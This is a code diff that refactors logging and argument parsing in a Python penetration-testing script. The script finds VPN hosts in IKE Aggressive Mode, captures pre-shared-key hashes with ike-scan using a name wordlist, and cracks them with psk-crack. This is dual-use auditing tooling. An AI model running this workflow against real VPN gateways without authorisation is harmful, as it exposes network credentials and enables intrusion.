@@ -25,11 +25,12 @@ import argparse
 import subprocess
 import logging
 
+import utils
 import config
-from utils import get_ips_with_port_open, text_file_lines_to_list, dir_exists, find_files
+import logging_config  # noqa pylint: disable=unused-import
 
 
-LOGLEVELS = {0: 'ERROR', 1: 'WARNING', 2: 'INFO', 3: 'DEBUG'}
+LOG = logging.getLogger("ptscripts.multi_pikebrute")
 
 
 def run_ike_scan(name, ip, output=None):
@@ -54,40 +55,28 @@ def run_pskcrack(psk_file, dictionary_path):
     return cp.stdout.decode('utf-8')
 
 
-def create_logger(verbose):
-    logger = logging.getLogger('main')
-    logger.setLevel(LOGLEVELS[verbose])
-    ch = logging.StreamHandler()
-    formatter = logging.Formatter('[{levelname}] {message}', style='{')  # pylint: disable=unexpected-keyword-arg
-    ch.setFormatter(formatter)
-    logger.addHandler(ch)
-
-
 def capture_hashes(ip_dir, wordlist, ip):
     """ Runs ike-scan with each name in wordlist and captures the hash. """
-    logger = logging.getLogger('main.capture_hashes')
     for name in wordlist:
         results = run_ike_scan(name, ip, ip_dir)
-        logger.debug(results)
+        LOG.debug(results)
 
 
 def is_aggressive(ip):
     """ We run ike-scan and look for aggressive in output. We return True if aggressive."""
-    logger = logging.getLogger('main.is_aggressive')
     results = run_ike_scan('test', ip)
-    logger.debug('Results: {}'.format(results))
+    LOG.debug('Results: {}'.format(results))
     if "Aggressive Mode" in results:
-        logger.info('Aggressive mode found for ip {}'.format(ip))
+        LOG.info('Aggressive mode found for ip {}'.format(ip))
         return True
     else:
-        logger.info('No aggressive mode found.')
+        LOG.info('No aggressive mode found.')
 
 
 def get_ike_aggressive(ips):
-    logger = logging.getLogger('main.get_ike_aggressive')
     aggressive_ips = []
     for ip in ips:
-        logger.info('Checking ike aggressive mode on ip: {}'.format(ip))
+        LOG.info('Checking ike aggressive mode on ip: {}'.format(ip))
         if is_aggressive(ip):
             aggressive_ips.append(ip)
     return aggressive_ips
@@ -97,46 +86,42 @@ def filter_pskcrack_output(results, ip, ip_dir, psk_file):
     """ Takes the results from run_pskcrack and filters the output to only the result line. """
     output = ""
     cracked = ""
-    logger = logging.getLogger('main.filter_pskcrack_output')
     lines = results.splitlines()
     for line in lines:
         if not line.startswith(('Starting', 'Ending', 'Running')):
             if not line.startswith('no match found'):
-                logger.info('PSK Cracked!: {}'.format(line))
+                LOG.info('PSK Cracked!: {}'.format(line))
                 cracked = "Cracked psk on ip: {}. PSK file: {}, psk-crack output: {}".format(
                     ip, os.path.join(ip_dir, psk_file), line)
             output = line
     return (output, cracked)
 
 
-def pikebrute_multi(args):  # pylint: disable=too-many-locals
+def main(args):  # pylint: disable=too-many-locals
     """ Wrapper for the pikebrute function that runs it once per ip. """
-    create_logger(args.verbose)
-    logger = logging.getLogger('main.pikebrute_multi')
     output = []
     cracked = []
     if args.dictionary:
         if os.path.isfile(args.dictionary):
-            logger.info('Using dictionary provided in arguments here: {}'.format(args.dictionary))
+            LOG.info('Using dictionary provided in arguments here: {}'.format(args.dictionary))
             dictionary_path = args.dictionary
         else:
-            logger.warn('Dictionary provided ({}) cannot be found, using the default.'.format(
+            LOG.warn('Dictionary provided ({}) cannot be found, using the default.'.format(
                 args.dictionary))
     else:
         dictionary_path = os.path.join(config.SCRIPTS_PATH, 'psk-crack-dictionary')
-        logger.info('Using the default dictionary: {}'.format(dictionary_path))
-    ike_ips = get_ips_with_port_open(args.input, 500)
+        LOG.info('Using the default dictionary: {}'.format(dictionary_path))
+    ike_ips = utils.get_ips_with_port_open(args.input, 500)
     aggressive = get_ike_aggressive(ike_ips)
-    vpn_name_list = text_file_lines_to_list(os.path.join(config.SCRIPTS_PATH, 'wordlist.dic'))
-    dir_exists(args.out_dir, True)
+    vpn_name_list = utils.text_file_lines_to_list(os.path.join(config.SCRIPTS_PATH, 'wordlist.dic'))
+    utils.dir_exists(args.out_dir, True)
     for ip in aggressive:
         ip_dir = os.path.join(args.out_dir, ip)
-        dir_exists(ip_dir, True)
+        utils.dir_exists(ip_dir, True)
         capture_hashes(ip_dir, vpn_name_list, ip)
         # Run psk-crack
-        psk_files = find_files(ip_dir, suffix='.hash')
+        psk_files = utils.find_files(ip_dir, suffix='.hash')
         for psk_file in psk_files:
-            logger.debug('')
             results = run_pskcrack(os.path.join(ip_dir, psk_file), dictionary_path)
             filtered_out, filtered_cracked = filter_pskcrack_output(results, ip, ip_dir, psk_file)
             if filtered_out:
@@ -147,22 +132,34 @@ def pikebrute_multi(args):  # pylint: disable=too-many-locals
     cracked_file = os.path.join(args.out_dir, "cracked_psks.txt")
     with open(results_file, 'w') as f:
         f.write('\r\n'.join(output))
-    with open(cracked_file, 'w') as f:
-        f.write('\r\n'.join(cracked))
+    if cracked:
+        with open(cracked_file, 'w') as f:
+            f.write('\r\n'.join(cracked))
 
 
-def parse_args():
-    parser = argparse.ArgumentParser(prog='pikebrute.py')
+def parse_args(args):
+    parser = argparse.ArgumentParser(
+        parents=[utils.parent_argparser()],
+        description='Run pikebrute on multiple servers.',
+        prog='pikebrute.py',
+    )
     parser.add_argument('input', help='CSV File created from nmap_to_csv.py.')
     parser.add_argument('out_dir', help='Output directory and working folder.')
     parser.add_argument(
         '--dictionary', '-d',
         help='Dictionary that psk_crack should use. If not provided the script will use the \
 psk-crack-dictionary. Must be the full path to the file.')
-    parser.add_argument('-v', action='count', default=0,
-                        help='Verbosity of the application. Max verbosity -vvv.')
-    return parser.parse_args()
+    args = parser.parse_args(args)
+    logger = logging.getLogger("ptscripts")
+    if args.quiet:
+        logger.setLevel('ERROR')
+    elif args.verbose:
+        logger.setLevel('DEBUG')
+    else:
+        logger.setLevel('INFO')
+    return args
 
 
 if __name__ == '__main__':
-    pikebrute_multi(parse_args())
+    import sys
+    main(parse_args(sys.argv[1:]))
